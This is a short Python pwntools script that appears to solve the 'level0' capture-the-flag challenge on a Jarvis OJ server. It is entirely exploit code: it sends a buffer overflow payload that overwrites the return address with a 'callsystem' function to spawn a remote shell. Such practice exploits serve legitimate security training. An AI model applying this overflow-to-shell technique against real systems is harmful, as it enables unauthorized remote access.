from pwn import *

#sh = process('./level0')
sh = remote('pwn2.jarvisoj.com', 9881)

elf = ELF('./level0')

shell_addr = elf.symbols['callsystem']

payload = 'a' * (0x80 + 0x8) + p64(shell_addr)

sh.send(payload)

sh.interactive()
sh.close()